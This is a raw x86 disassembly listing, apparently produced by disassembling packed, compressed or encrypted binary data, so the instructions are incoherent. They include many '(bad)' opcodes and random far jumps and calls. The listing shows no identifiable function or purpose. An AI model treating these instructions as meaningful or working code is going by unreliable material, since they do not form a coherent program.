  4194e2:	jnp    0x4194b7
  4194e4:	std    
  4194e5:	mov    bl,0xd0
  4194e7:	jp     0x419515
  4194e9:	jle    0x4194c5
  4194eb:	inc    BYTE PTR [ebp+0x52]
  4194ee:	je     0x419528
  4194f0:	outs   dx,BYTE PTR ds:[esi]
  4194f1:	rcl    cl,cl
  4194f3:	and    DWORD PTR [edx+0x3776fd27],eax
  4194f9:	stos   BYTE PTR es:[edi],al
  4194fa:	lods   eax,DWORD PTR ds:[esi]
  4194fb:	mov    ds:0xce13c44f,al
  419500:	sbb    edx,DWORD PTR [edi-0x4a]
  419503:	push   ss
  419504:	jl     0x419555
  419506:	push   eax
  419507:	repz add eax,0xa7b64182
  41950d:	pushf  
  41950e:	scas   eax,DWORD PTR es:[edi]
  41950f:	dec    esi
  419510:	adc    eax,edx
  419512:	cmp    BYTE PTR [edi+0x1c],bl
  419515:	imul   dx,WORD PTR es:[ebx-0x7c198852],0xffb7
  41951e:	push   ds
  41951f:	hlt    
  419520:	add    bh,cl
  419522:	cli    
  419523:	xor    cl,dl
  419525:	mov    BYTE PTR [ebx],bh
  419527:	cmc    
  419528:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419529:	(bad)  
  41952a:	mov    esp,0x9d1d485c
  41952f:	pop    eax
  419530:	fisttp WORD PTR [ebp+0x1e]
  419533:	ja     0x41956b
  419535:	das    
  419536:	ins    DWORD PTR es:[edi],dx
  419537:	imul   ecx,ecx,0x533ff302
  41953d:	scas   al,BYTE PTR es:[edi]
  41953e:	lahf   
  41953f:	loop   0x4194cc
  419541:	lds    edx,FWORD PTR [ebx+eax*1+0x59e46c9]
  419548:	pop    es
  419549:	ror    BYTE PTR [eax-0x57],cl
  41954c:	adc    al,0xac
  41954e:	push   ds
  41954f:	cmp    esi,DWORD PTR [edi-0x334b0618]
  419555:	retf   0xe830
  419558:	es pop ecx
  41955a:	mov    BYTE PTR [ecx+0x77],bl
  41955d:	jae    0x419586
  41955f:	or     al,0x60
  419561:	je     0x41955d
  419563:	test   eax,eax
  419565:	sub    BYTE PTR [edx-0x3ac21aeb],al
  41956b:	sub    eax,0x30c3cd05
  419570:	xor    dl,BYTE PTR [ebp+edi*4+0x6afac0f6]
  419577:	outs   dx,BYTE PTR ds:[esi]
  419578:	(bad)  
  419579:	sbb    eax,DWORD PTR [ecx+0x44]
  41957c:	xchg   ebp,eax
  41957d:	dec    edx
  41957e:	sbb    BYTE PTR [ecx+0x1f],al
  419581:	into   
  419582:	outs   dx,BYTE PTR ds:[esi]
  419583:	and    eax,0x6bb986
  419588:	fstp   TBYTE PTR [eax+0x2e]
  41958b:	ror    DWORD PTR [ecx],cl
  41958d:	fs jecxz 0x41960a
  419590:	cdq    
  419591:	mov    ds:0x76aad8ec,al
  419596:	jb     0x4195b0
  419598:	stc    
  419599:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41959a:	pop    ax
  41959c:	mov    esp,0x61f63225
  4195a1:	sbb    BYTE PTR [edi-0x72f4ba34],dh
  4195a7:	push   ebx
  4195a8:	pop    ds
  4195a9:	jg     0x419560
  4195ab:	jmp    FWORD PTR [edi+ecx*8+0x7f]
  4195af:	mov    bh,0xb2
  4195b1:	inc    edi
  4195b2:	into   
  4195b3:	das    
  4195b4:	sti    
  4195b5:	test   al,0xeb
  4195b7:	repz sbb edi,DWORD PTR [ecx-0x41]
  4195bb:	je     0x419581
  4195bd:	(bad)  
  4195be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4195bf:	pushf  
  4195c0:	pop    ebx
  4195c1:	scas   eax,DWORD PTR es:[di]
  4195c3:	pop    edi
  4195c4:	xchg   esi,eax
  4195c5:	call   0xa4fd:0x5778609c
  4195cc:	sbb    ch,BYTE PTR [edi]
  4195ce:	les    ebp,FWORD PTR [eax-0x46]
  4195d1:	sbb    eax,0xe64c6ca0
  4195d6:	call   0x96e5:0x54024289
  4195dd:	mov    bh,0xe4
  4195df:	jecxz  0x4195e2
  4195e1:	sub    BYTE PTR [edx+0x53],0xe9
  4195e5:	pusha  
  4195e6:	mov    eax,0xdf1b6361
  4195eb:	retf   
  4195ec:	loope  0x4195e4
  4195ee:	fadd   st(6),st
  4195f0:	jae    0x4195d8
  4195f2:	sbb    al,0xdf
  4195f4:	sti    
  4195f5:	and    eax,0x870a4a5d
  4195fa:	xchg   esp,eax
  4195fb:	sar    DWORD PTR [esp+ebx*4+0x30],cl
  4195ff:	and    al,BYTE PTR [edi+esi*8-0x66]
  419603:	loopne 0x419626
  419605:	mov    edi,0x1949a321
  41960a:	push   cs
  41960b:	jne    0x4195b9
  41960d:	ins    BYTE PTR es:[edi],dx
  41960e:	leave  
  41960f:	mov    edi,0xabdc9bc3
  419614:	mov    dl,BYTE PTR [esp+edx*8+0x46]
  419618:	cmp    DWORD PTR [ebp+0x1845e366],0x322c6ea4
  419622:	sub    BYTE PTR [edx-0x26ef5aa6],cl
  419628:	out    0x6b,al
  41962a:	push   0x28
  41962c:	fsub   QWORD PTR [edx+0x26]
  41962f:	sti    
  419630:	mov    cl,0xe6
  419632:	mov    ebp,0x772aa12e
  419637:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419638:	in     al,dx
  419639:	std    
  41963a:	sbb    edi,esi
  41963c:	retf   0xd450
  41963f:	sbb    eax,0xfdd6bb6
  419644:	pop    ds
  419645:	add    esi,DWORD PTR [edx]
  419647:	inc    edx
  419648:	jns    0x419613
  41964a:	aaa    
  41964b:	push   ds
  41964c:	push   eax
  41964d:	shl    BYTE PTR [ebp+edi*2+0x566b60e1],cl
  419654:	lea    ebp,[edx+eax*2+0x2]
  419658:	sub    dh,ah
  41965a:	jnp    0x41963b
  41965c:	out    dx,eax
  41965d:	xchg   edi,eax
  41965e:	int    0x7a
  419660:	xchg   esp,eax
  419661:	jne    0x419632
  419663:	scas   eax,DWORD PTR es:[edi]
  419664:	out    dx,al
  419665:	mov    ebx,0x358b132f
  41966a:	sub    eax,0xe642d0ba
  41966f:	mov    cl,0x9e
  419671:	lock mov ds:0x154ba65e,al
  419677:	js     0x4196cd
  419679:	add    al,BYTE PTR [esi-0x1dbd21cf]
  41967f:	adc    esi,eax
  419681:	lods   eax,DWORD PTR ds:[esi]
  419682:	out    dx,al
  419683:	lods   al,BYTE PTR ds:[esi]
  419684:	inc    esp
  419685:	mov    ch,BYTE PTR [edx-0x203abb3d]
  41968b:	push   cs
  41968c:	fild   QWORD PTR [eax-0x6c]
  41968f:	into   
  419690:	mov    ch,0x3e
  419692:	int    0xd2
  419694:	nop    esp
  419697:	enter  0xdadb,0xad
  41969b:	adc    ebp,DWORD PTR [ebx-0x1fb53890]
  4196a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196a2:	(bad)  
  4196a3:	push   ebx
  4196a4:	fmul   QWORD PTR [ebx]
  4196a6:	push   ss
  4196a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196a8:	daa    
  4196a9:	mov    bl,BYTE PTR [ebx-0x7b]
  4196ac:	mov    dl,0x64
  4196ae:	test   al,0x2c
  4196b0:	pusha  
  4196b1:	out    0xd4,al
  4196b3:	int3   
  4196b4:	mov    dl,0x24
  4196b6:	jp     0x41965c
  4196b8:	mov    bh,0x7c
  4196ba:	inc    edx
  4196bb:	adc    BYTE PTR [ebp+0x5b],dl
  4196be:	stos   BYTE PTR es:[edi],al
  4196bf:	ja     0x419679
  4196c1:	mov    bh,0x51
  4196c3:	pop    ds
  4196c4:	or     eax,edi
  4196c6:	retf   0x22a2
  4196c9:	outs   dx,BYTE PTR ds:[esi]
  4196ca:	mov    edi,0x4e510d96
  4196cf:	dec    edx
  4196d0:	jecxz  0x419656
  4196d2:	test   ebp,0x171a52ed
  4196d8:	data16 dec BYTE PTR [ecx]
  4196db:	inc    esp
  4196dc:	hlt    
  4196dd:	push   ss
  4196de:	or     ebx,DWORD PTR [ebx-0x2f6c3bfe]
  4196e4:	mov    al,0x3b
  4196e6:	pop    ss
  4196e7:	or     eax,0x3de4e606
  4196ec:	mov    ds:0xed47b641,al
  4196f1:	hlt    
  4196f2:	dec    eax
  4196f3:	dec    ecx
  4196f4:	jle    0x419748
  4196f6:	hlt    
  4196f7:	jmp    0xb936:0x1e784652
  4196fe:	push   esp
  4196ff:	sub    eax,0xab984eeb
  419704:	mov    dh,0x91
  419706:	dec    edi
  419707:	out    0xb0,al
  419709:	xor    bh,ah
  41970b:	dec    ecx
  41970c:	mov    eax,0x314b4c64
  419711:	ss in  eax,dx
  419713:	mov    esi,0x5ff252f5
  419718:	dec    edx
  419719:	pop    eax
  41971a:	fstp   TBYTE PTR [esi]
  41971c:	inc    edx
  41971d:	lods   al,BYTE PTR ds:[esi]
  41971e:	call   0x2999:0x1b516c62
  419725:	xor    BYTE PTR [ebx],dl
  419727:	xor    ecx,ebx
  419729:	xchg   esi,eax
  41972a:	push   ecx
  41972b:	out    0xf8,al
  41972d:	sub    ebp,esp
  41972f:	test   BYTE PTR ds:0xc3010c65,bl
  419735:	test   BYTE PTR [edx-0x5e120e75],al
  41973b:	push   0xffffffba
  41973d:	jmp    0x4196c5
  41973f:	cwde   
  419740:	aad    0x8d
  419742:	in     eax,0xd1
  419744:	and    DWORD PTR [eax+0x79],esp
  419747:	add    esi,edx
  419749:	(bad)  
  41974a:	adc    BYTE PTR [edi],cl
  41974c:	imul   edi,esi,0x688dac5b
  419752:	repnz mov al,0x5
  419755:	push   0x91e4bc6
  41975a:	scas   al,BYTE PTR es:[edi]
  41975b:	push   edi
  41975c:	aaa    
  41975d:	xor    bh,BYTE PTR ds:0xfb41ea32
  419763:	jae    0x4196f6
  419765:	mov    edi,0xd09a04e1
  41976a:	jmp    0x6958f1ed
  41976f:	xchg   ebx,eax
  419770:	jecxz  0x419707
  419772:	xor    ebp,DWORD PTR [ecx]
  419774:	push   ds
  419775:	xor    esi,esi
  419777:	stos   DWORD PTR es:[edi],eax
  419778:	jbe    0x4197ef
  41977a:	jmp    FWORD PTR [esi]
  41977c:	(bad)  
  41977d:	jns    0x4197e5
  41977f:	push   0x388fbe96
  419784:	or     esp,DWORD PTR [esi-0x21]
  419787:	mov    edi,0x837df935
  41978c:	sub    ch,al
  41978e:	or     al,0x7a
  419790:	repnz out dx,eax
  419792:	push   esi
  419793:	pop    eax
  419794:	sbb    dl,bh
  419796:	fwait
  419797:	das    
  419798:	adc    eax,0xa921bb7c
  41979d:	and    ebp,DWORD PTR [edi+edi*2-0x4ef3a957]
  4197a4:	inc    edx
  4197a5:	mov    esi,0x62bd70e6
  4197aa:	and    cl,BYTE PTR [ebx-0x2f2406b8]
  4197b0:	xchg   ebx,eax
  4197b1:	loope  0x419764
  4197b3:	retf   
  4197b4:	pop    ebp
  4197b5:	or     DWORD PTR [ebx-0x74],esi
  4197b8:	out    dx,al
  4197b9:	sub    ebp,edi
  4197bb:	inc    ebp
  4197bc:	adc    edi,DWORD PTR [ecx]
  4197be:	pop    ecx
  4197bf:	mov    DWORD PTR [edx+0x53fd72c4],ecx
  4197c5:	frstor [bx]
  4197c8:	sbb    al,BYTE PTR [edi+0x4027c054]
  4197ce:	or     al,0x69
  4197d0:	shl    BYTE PTR [eax-0x1],1
  4197d3:	(bad)  
  4197d4:	inc    ecx
  4197d5:	mov    ch,0x48
  4197d7:	js     0x419792
  4197d9:	call   0x5c1ab4d9
  4197de:	clc    
  4197df:	mov    al,0xa7
  4197e1:	mov    bh,0x2c
  4197e3:	xchg   edi,eax
  4197e4:	neg    bh
  4197e6:	out    0x36,al
  4197e8:	add    BYTE PTR [ebx-0x759feb9d],0xf6
  4197ef:	or     ch,BYTE PTR [ebx+0x6c514beb]
  4197f5:	repnz mov ds:0xf919dff5,al
  4197fb:	outs   dx,BYTE PTR ds:[esi]
  4197fc:	pop    edi
  4197fd:	clc    
  4197fe:	dec    ecx
  4197ff:	(bad)
  419802:	mov    al,ds:0xa14f8947
  419807:	adc    al,0xac
  419809:	jae    0x4197ce
  41980b:	push   edi
  41980c:	cwde   
  41980d:	mov    dl,0xac
  41980f:	(bad)  
  419810:	push   edi
  419811:	ins    BYTE PTR es:[edi],dx
  419812:	pop    es
  419813:	push   es
  419814:	pop    edx
  419815:	(bad)  
  419816:	(bad)  
  419817:	(bad)  
  419818:	jmp    0x419862
  41981a:	in     al,dx
  41981b:	xchg   ebp,eax
  41981c:	call   0x5d0acca9
  419821:	cmp    al,0x60
  419823:	nop
  419824:	(bad)  
  419825:	jo     0x4197d1
  419827:	sar    DWORD PTR [edx-0xf],0x4f
  41982b:	out    dx,al
  41982c:	jb     0x419823
  41982e:	xor    al,0x33
  419830:	mov    ds:0x5bc19769,eax
  419835:	inc    esi
  419836:	or     al,0x56
  419838:	call   0xb9a6ce8b
  41983d:	xchg   ebp,eax
  41983e:	call   0x5e73e175
  419843:	or     edx,ebx
  419845:	clc    
  419846:	lods   eax,DWORD PTR ds:[esi]
  419847:	repz sahf 
  419849:	mov    esi,ebp
  41984b:	inc    esp
  41984c:	add    esi,DWORD PTR gs:[edi]
  41984f:	repz cmp DWORD PTR [ecx+ecx*4+0x29],esi
  419854:	outs   dx,BYTE PTR ds:[esi]
  419855:	mov    bl,0x72
  419857:	sub    ecx,0x734629
  41985d:	xlat   BYTE PTR ds:[ebx]
  41985e:	jp     0x419889
  419860:	and    eax,0x6149c4f0
  419865:	push   ecx
  419866:	outs   dx,DWORD PTR ds:[esi]
  419867:	adc    eax,0x6a0e28cf
  41986c:	retf   
  41986d:	push   0xffffff9c
  41986f:	(bad)  
  419870:	cmc    
  419871:	mov    dl,0xcf
  419873:	xchg   edx,eax
  419874:	xchg   BYTE PTR [esi+edx*8],cl
  419877:	retf   
  419878:	ror    BYTE PTR [edi+0x764a2f99],0x62
  41987f:	arpl   WORD PTR [esi],bx
  419881:	mov    dh,0xb9
  419883:	retf   
  419884:	xchg   edx,eax
  419885:	int    0x2e
  419887:	and    eax,0x29004b7a
  41988c:	xlat   BYTE PTR ds:[ebx]
  41988d:	addr16 mov esp,0xc46e51cc
  419893:	in     al,0x16
  419895:	and    al,0x1f
  419897:	add    dl,dh
  419899:	jno    0x4198cc
  41989b:	add    al,0x2c
  41989d:	push   ebp
  41989e:	or     al,0x9f
  4198a0:	jae    0x4198c3
  4198a2:	(bad)  
  4198a4:	aam    0xda
  4198a6:	stos   BYTE PTR es:[edi],al
  4198a7:	mov    ds:0xab731097,eax
  4198ac:	xor    dl,0x74
  4198af:	scas   al,BYTE PTR es:[edi]
  4198b0:	pop    es
  4198b1:	dec    ecx
  4198b2:	(bad)  
  4198b3:	pop    edx
  4198b4:	xchg   edi,eax
  4198b5:	pop    esi
  4198b6:	ja     0x4198e7
  4198b8:	(bad)  
  4198b9:	mov    bh,0xbd
  4198bb:	sbb    DWORD PTR [ebp-0x7a019856],eax
  4198c1:	pop    edx
  4198c2:	jno    0x419912
  4198c4:	jno    0x41992f
  4198c6:	data16 xor BYTE PTR [ebx*8+0x3a658f60],ch
  4198ce:	fsub   DWORD PTR [ebx+ecx*4+0x5d]
  4198d2:	sar    DWORD PTR [esi],0x91
  4198d5:	in     eax,dx
  4198d6:	mov    DWORD PTR [ebp-0x16],ebx
  4198d9:	xor    eax,0xeddd5547
  4198de:	loop   0x4198fb
  4198e0:	xor    eax,0x9f98d6a6
  4198e5:	jg     0x41993f
  4198e7:	mov    ds:0x6ae1b869,al
  4198ec:	push   edi
  4198ed:	retf   0x232c
  4198f0:	(bad)  
  4198f1:	mov    edi,0x28d07938
  4198f6:	xchg   BYTE PTR [edi+0x45],dh
  4198f9:	push   eax
  4198fa:	or     al,0xf8
  4198fc:	pop    eax
  4198fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198fe:	lea    ecx,[ecx-0x397589d8]
  419904:	add    ah,BYTE PTR fs:[edi]
  419907:	jge    0x4198e8
  419909:	dec    edi
  41990a:	mul    DWORD PTR [edi+0x21]
  41990d:	xchg   esp,eax
  41990e:	in     al,dx
  41990f:	jecxz  0x4198c3
  419911:	std    
  419912:	inc    esi
  419913:	and    BYTE PTR [edi+0x6b58cb8b],dh
  419919:	mov    al,0x29
  41991b:	mov    ds:0x21e08e39,eax
  419920:	sbb    bl,al
  419922:	in     eax,dx
  419923:	mov    ch,0xf1
  419925:	dec    eax
  419926:	ins    DWORD PTR es:[edi],dx
  419927:	fmul   DWORD PTR [ebx+0x74]
  41992a:	cmp    BYTE PTR [eax-0x3b],cl
  41992d:	pop    ds
  41992e:	or     DWORD PTR [ebx-0x4d],ebp
  419931:	fwait
  419932:	leave  
  419933:	js     0x4198e4
  419935:	shl    DWORD PTR [eax-0x54],0x1e
  419939:	popf   
  41993a:	inc    edi
  41993b:	inc    ebx
  41993c:	jno    0x419991
  41993e:	push   ss
  41993f:	jge    0x419973
  419941:	enter  0xcbe2,0x37
  419945:	int3   
  419946:	sbb    BYTE PTR [ecx+0x7b714a34],0xb0
  41994d:	inc    edx
  41994e:	je     0x419913
  419950:	mov    DWORD PTR [eax],0xcb324d4c
  419956:	jnp    0x41999f
  419958:	in     eax,0x29
  41995a:	cs inc esp
  41995c:	sub    DWORD PTR [esp+eax*8-0xf],eax
  419960:	repz jecxz 0x41998e
  419963:	cmp    ch,BYTE PTR [esi]
  419965:	daa    
  419966:	inc    ebx
  419967:	int    0x66
  419969:	nop
  41996a:	push   edx
  41996b:	xor    edi,DWORD PTR [esi+0x1]
  41996e:	push   edx
  41996f:	mov    eax,ds:0x9b986d8d
  419974:	ret    
  419975:	jle    0x419986
  419977:	or     eax,0xb373fcdd
  41997c:	ret    
  41997d:	aaa    
  41997e:	mov    dl,0x6a
  419980:	pop    ss
  419981:	out    0x68,eax
  419983:	(bad)  
  419984:	out    0x6e,eax
  419986:	dec    esp
  419987:	test   eax,0xfa63aa60
  41998c:	or     ebx,esi
  41998e:	inc    ebp
  41998f:	cs aam 0x24
  419992:	int3   
  419993:	es or  eax,0x35f13162
  419999:	add    al,0xbb
  41999b:	xchg   esi,eax
  41999c:	jne    0x419959
  41999e:	or     DWORD PTR [ecx-0x6bbcc37c],eax
  4199a4:	mov    eax,0x84a5643e
  4199a9:	mov    esi,0xf6352fb8
  4199ae:	sahf   
  4199af:	out    0x7d,al
  4199b1:	hlt    
  4199b2:	sbb    al,0x9b
  4199b4:	mov    ds:0x8ef1aa02,eax
  4199b9:	push   eax
  4199ba:	arpl   WORD PTR [edx],si
  4199bc:	ja     0x4199c1
  4199be:	push   ss
  4199bf:	pushf  
  4199c0:	out    dx,al
  4199c1:	jecxz  0x4199cf
  4199c3:	push   esp
  4199c4:	lods   al,BYTE PTR ds:[esi]
  4199c5:	clc    
  4199c6:	mov    ds:0x95cbb1e2,eax
  4199cb:	aas    
  4199cc:	jg     0x419981
  4199ce:	cwde   
  4199cf:	mov    edx,esi
  4199d1:	jmp    0x419a32
  4199d3:	adc    ch,BYTE PTR [ecx+0x376ad0f7]
  4199d9:	ds mov bh,0x4b
  4199dc:	mov    ecx,0xbea1a3e6
  4199e1:	int    0x98
  4199e3:	daa    
  4199e4:	push   esp
  4199e5:	js     0x4199c7
  4199e7:	and    BYTE PTR [ebp-0x5b4786cb],0x74
  4199ee:	out    dx,eax
  4199ef:	outs   dx,DWORD PTR ds:[esi]
  4199f0:	loope  0x4199f3
  4199f2:	test   BYTE PTR [ebp-0x4f651bfb],ch
  4199f8:	fmul   DWORD PTR [ebx]
  4199fa:	dec    eax
  4199fb:	add    eax,0xbfc31c56
  419a00:	iret   
  419a01:	arpl   WORD PTR [ebx-0x36],sp
  419a04:	fsubr  DWORD PTR ds:0x96a86246
  419a0a:	pushf  
  419a0b:	dec    esi
  419a0c:	lds    ebp,FWORD PTR [edx+0x14]
  419a0f:	lea    esi,[ebp-0x55993353]
  419a15:	jl     0x4199c0
  419a17:	stos   DWORD PTR es:[edi],eax
  419a18:	fisttp DWORD PTR [edi]
  419a1a:	je     0x4199a3
  419a1c:	aad    0x91
  419a1e:	int3   
  419a1f:	jne    0x419a74
  419a21:	mov    bl,0xd8
  419a23:	and    ch,ah
  419a25:	shr    cl,1
  419a27:	mov    eax,0x25052ca
  419a2c:	enter  0x96a,0xd5
  419a30:	adc    DWORD PTR [edx-0x482cfae4],edx
  419a36:	and    eax,0xddec1aaa
  419a3b:	inc    esp
  419a3c:	shl    BYTE PTR [esi-0x4bba8789],1
  419a42:	inc    esi
  419a43:	xchg   esp,eax
  419a44:	inc    esi
  419a45:	lods   eax,DWORD PTR ds:[esi]
  419a46:	xchg   esi,eax
  419a47:	jbe    0x419a57
  419a49:	xchg   ebp,eax
  419a4a:	clc    
  419a4b:	into   
  419a4c:	push   edi
  419a4d:	sbb    DWORD PTR [ebp+0x5b33fd1d],esp
  419a53:	not    BYTE PTR [ebx]
  419a55:	stos   BYTE PTR es:[edi],al
  419a56:	dec    edi
  419a57:	std    
  419a58:	pop    edi
  419a59:	xchg   bl,dh
  419a5b:	ret    
  419a5c:	mov    DWORD PTR [ecx+0x545a001c],ebx
  419a62:	push   ecx
  419a63:	icebp  
  419a64:	dec    esi
  419a65:	mov    edi,0xabf34802
  419a6a:	cs retf 0xf666
  419a6e:	sub    BYTE PTR ds:0x9cb6697a,ah
  419a74:	mov    esi,esp
  419a76:	mov    bl,0xa8
  419a78:	inc    eax
  419a79:	mov    ebp,0x99448003
  419a7e:	mov    cl,0xc1
  419a80:	(bad)  [edx-0x9f86506]
  419a86:	mov    bh,0x77
  419a88:	ja     0x419a8d
  419a8a:	rdpmc  
  419a8c:	fdiv   QWORD PTR [ebx+eiz*1]
  419a8f:	ss cmp eax,0xedf45854
  419a95:	mov    bh,0x53
  419a97:	test   BYTE PTR [eax-0x5a],ch
  419a9a:	jbe    0x419ad0
  419a9c:	hlt    
  419a9d:	int    0xa2
  419a9f:	outs   dx,DWORD PTR ds:[esi]
  419aa0:	jns    0x419ae4
  419aa2:	jnp    0x419a30
  419aa4:	pop    ecx
  419aa6:	or     DWORD PTR [edx+edx*2+0x7bd926f0],ebx
  419aad:	xchg   edi,eax
  419aae:	stos   DWORD PTR es:[edi],eax
  419aaf:	xchg   esi,eax
  419ab0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ab1:	(bad)  
  419ab2:	outs   dx,BYTE PTR ds:[esi]
  419ab3:	jbe    0x419b22
  419ab5:	lods   al,BYTE PTR ds:[esi]
  419ab6:	fld    TBYTE PTR [eax]
  419ab8:	adc    eax,0x936bf4f5
  419abd:	mov    bh,0x9a
  419abf:	dec    ecx
  419ac0:	push   ebx
  419ac1:	sub    DWORD PTR ds:0xe728f52,esi
  419ac7:	mov    ebp,cs
  419ac9:	rcr    BYTE PTR [ecx+ebp*1+0x39],1
  419acd:	jg     0x419a86
  419acf:	fild   DWORD PTR [ebp-0x1]
  419ad2:	cli    
  419ad3:	pusha  
  419ad4:	test   DWORD PTR [ebx+0x56d6d6f6],esp
  419ada:	ret    0x17ec
  419add:	push   es
  419ade:	stc    
  419adf:	ret    
  419ae0:	inc    esi
  419ae1:	jnp    0x419afd
  419ae3:	and    BYTE PTR [edi+0x1f],dl
  419ae6:	jno    0x419ad3
  419ae8:	cdq    
  419ae9:	push   edi
  419aea:	loop   0x419b2b
  419aec:	push   cs
  419aed:	mov    ebp,0xa3463efe
  419af2:	add    DWORD PTR [edi],ecx
  419af4:	mov    ebp,0xe138b9b7
  419af9:	in     al,dx
  419afa:	mov    ds:0x4f4543ba,al
  419aff:	fstp   QWORD PTR [eax+edx*8]
  419b02:	ficomp WORD PTR [ecx]
  419b04:	(bad)  
  419b05:	and    ebp,ecx
  419b07:	call   DWORD PTR [edx]
  419b09:	call   0x2bff2812
  419b0e:	nop
  419b0f:	arpl   WORD PTR [ebx-0x37b93831],si
  419b15:	ss jmp 0xd9f7106e
  419b1b:	inc    esp
  419b1c:	dec    esi
  419b1d:	dec    esi
  419b1e:	pop    ss
  419b1f:	mov    edx,0x21f14d55
  419b24:	outs   dx,DWORD PTR ds:[esi]
  419b25:	or     BYTE PTR [edx+0x560ff15b],bh
  419b2b:	xchg   esi,eax
  419b2c:	stos   BYTE PTR es:[edi],al
  419b2d:	cdq    
  419b2e:	clc    
  419b2f:	gs stos DWORD PTR es:[edi],eax
  419b31:	dec    edi
  419b32:	aas    
  419b33:	and    BYTE PTR [ebx],al
  419b35:	int    0x88
  419b37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b38:	sub    bh,BYTE PTR ds:0x2c66e181
  419b3e:	imul   edi,DWORD PTR [esi],0x46d12451
  419b44:	daa    
  419b45:	(bad)  
  419b46:	mov    al,ds:0xa4bd0805
  419b4b:	mov    bx,0x95dc
  419b4f:	xchg   edx,eax
  419b50:	xchg   esp,eax
  419b51:	and    ebx,DWORD PTR [ebx]
  419b53:	lods   eax,DWORD PTR ds:[esi]
  419b54:	mov    esi,0x43eb0f6e
  419b59:	adc    bh,BYTE PTR [ecx]
  419b5b:	dec    ebp
  419b5c:	add    eax,0x31b662a7
  419b61:	inc    esi
  419b62:	out    0x82,eax
  419b64:	sub    dh,cl
  419b66:	sbb    ch,0x8e
  419b69:	mov    ?,WORD PTR [ecx]
  419b6b:	mov    eax,ds:0xa6e1e3fa
  419b70:	or     al,0xb8
  419b72:	sbb    ax,0xab66
  419b76:	mov    cl,0x51
  419b78:	inc    esp
  419b79:	imul   ebx,DWORD PTR [ebp+0x15a8a96b],0xbb34cc34
  419b83:	pop    ss
  419b84:	sub    al,0x91
  419b86:	inc    ecx
  419b87:	lock xor al,BYTE PTR [edx]
  419b8a:	inc    esi
  419b8b:	outs   dx,BYTE PTR ds:[esi]
  419b8c:	and    eax,0x9305c6f
  419b91:	fnstenv [edi]
  419b93:	arpl   WORD PTR [esi-0x498509f9],ax
  419b99:	ins    DWORD PTR es:[edi],dx
  419b9a:	int3   
  419b9b:	aad    0xc4
  419b9d:	push   0x63eaf6f0
  419ba2:	or     DWORD PTR [eax],0x694535f7
  419ba8:	shr    edx,1
  419baa:	in     al,dx
  419bab:	add    esi,DWORD PTR [esi-0x1c]
  419bae:	test   eax,0x67b5c4e4
  419bb3:	cmc    
  419bb4:	pop    ds
  419bb5:	(bad)  
  419bb6:	xchg   edi,eax
  419bb7:	mov    ecx,gs
  419bb9:	mov    ebx,0xdf2f7926
  419bbe:	ja     0x419bcd
  419bc0:	lahf   
  419bc1:	adc    esi,edi
  419bc3:	lods   al,BYTE PTR ds:[esi]
  419bc4:	jmp    0xea7c:0x722af24a
  419bcb:	and    BYTE PTR [eax],bh
  419bcd:	(bad)  
  419bce:	push   cs
  419bcf:	jp     0x419b9e
  419bd1:	sbb    BYTE PTR [ecx-0x54],0x7c
  419bd5:	push   cs
  419bd6:	xlat   BYTE PTR ds:[ebx]
  419bd7:	call   DWORD PTR [ebp+0x3a65677d]
  419bdd:	fmul   DWORD PTR [esi+0x2afd16b3]
  419be3:	pop    ss
  419be4:	xlat   BYTE PTR ds:[ebx]
  419be5:	xchg   edx,eax
  419be6:	fbld   TBYTE PTR [edi+eiz*1]
  419be9:	scas   al,BYTE PTR es:[edi]
  419bea:	pusha  
  419beb:	push   ecx
  419bec:	daa    
  419bed:	inc    ebx
  419bee:	ja     0x419bf9
  419bf0:	jle    0x419c56
  419bf2:	sub    DWORD PTR [eax-0x38],edi
  419bf5:	das    
  419bf6:	or     bl,BYTE PTR [bp+di-0x6b7]
  419bfb:	xor    al,0x4f
  419bfd:	pop    ds
  419bfe:	(bad)  
  419bff:	sahf   
  419c00:	and    eax,esi
  419c02:	xor    esp,eax
  419c04:	push   ebx
  419c05:	fisttp DWORD PTR [edx+0x6f]
  419c08:	call   FWORD PTR [ecx]
  419c0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c0b:	shl    dh,cl
  419c0d:	mov    ds:0x14519c4c,al
  419c12:	popa   
  419c13:	push   0xffffffaf
  419c15:	mov    DWORD PTR [edx],ebp
  419c17:	call   0x3dec7a7f
  419c1c:	scas   eax,DWORD PTR es:[edi]
  419c1d:	lock pop DWORD PTR [eax+0x3c85ad45]
  419c24:	dec    edx
  419c25:	test   BYTE PTR [ebx-0x55d15b9d],ah
  419c2b:	xchg   ebp,eax
  419c2c:	aas    
  419c2d:	dec    edx
  419c2e:	push   ebx
  419c2f:	push   0x57
  419c31:	push   edx
  419c32:	or     al,BYTE PTR [edx]
  419c34:	mov    ds:0x89479c5f,eax
  419c39:	(bad)  
  419c3a:	dec    edx
  419c3b:	popa   
  419c3c:	add    BYTE PTR [eax-0x61c53357],ch
  419c42:	jns    0x419c90
  419c44:	jnp    0x419bdc
  419c46:	mov    ecx,0xda9be258
  419c4b:	ret    0xb902
  419c4e:	xchg   ebx,eax
  419c4f:	mov    BYTE PTR [edi+0x71],dl
  419c52:	pop    esp
  419c53:	rcr    dh,1
  419c55:	lock mov eax,ds:0x6022d31d
  419c5b:	mov    ch,0x33
  419c5d:	rcr    eax,1
  419c5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c60:	pop    edi
  419c61:	dec    ebp
  419c62:	cmp    BYTE PTR [ecx+0x43],bl
  419c65:	cld    
  419c66:	add    BYTE PTR [edi+0x1f],bl
  419c69:	xor    ebp,DWORD PTR [esi+0x8]
  419c6c:	mov    WORD PTR [esi-0x6e],es
  419c6f:	clc    
  419c70:	iret   
  419c71:	dec    esi
  419c72:	dec    edx
  419c73:	or     cl,BYTE PTR [eax-0x30]
  419c76:	cli    
  419c77:	or     DWORD PTR [ecx+ecx*8+0x14],ebx
  419c7b:	add    eax,0xcb38ccb5
  419c80:	daa    
  419c81:	sbb    BYTE PTR ds:0x5002db7d,0xc1
  419c88:	rcr    DWORD PTR [eax+0x75],1
